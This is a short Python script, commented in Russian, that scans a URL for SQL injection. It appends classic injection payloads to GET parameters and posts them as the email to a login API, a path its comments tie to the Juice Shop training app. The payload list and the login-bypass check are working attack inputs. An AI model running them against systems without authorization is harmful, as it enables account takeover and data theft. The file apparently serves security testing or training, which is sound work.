import requests
import logging

# Настройка
PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1 --",
    "' UNION SELECT 1,2,3 --",
    "admin' --"
]

ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "SQLite Error",
    "syntax error"
]

def scan_sql_injection(url: str) -> bool:
    """
    Сканирует URL на SQL-инъекции (GET параметры и базовые проверки API).
    """
    target_url = url.split('?')[0] # Базовый URL
    
    # 1. Проверка GET параметров (классика)
    if '?' in url:
        for payload in PAYLOADS:
            # Пробуем вставить пейлоад в конец URL
            test_url = f"{url}{payload}"
            try:
                r = requests.get(test_url, timeout=3)
                if any(e in r.text for e in ERRORS):
                    logging.warning(f"SQLi found in URL: {test_url}")
                    return True
            except: pass
                
    # Пытаемся отправить логин с SQLi
    api_login_url = f"{target_url.rstrip('/')}/rest/user/login" # Типичный путь для Juice Shop
    for payload in PAYLOADS:
        json_data = {
            "email": payload,
            "password": "password"
        }
        try:
            r = requests.post(api_login_url, json=json_data, timeout=3)
            # Если вернулся успешный токен или специфическая ошибка
            if r.status_code == 200 and "token" in r.text:
                logging.warning(f"SQLi found in JSON API: {api_login_url}")
                return True
            if r.status_code == 500 and any(e in r.text for e in ERRORS):
                logging.warning("SQLi Error leaked in API")
                return True
        except: pass
        
    return False
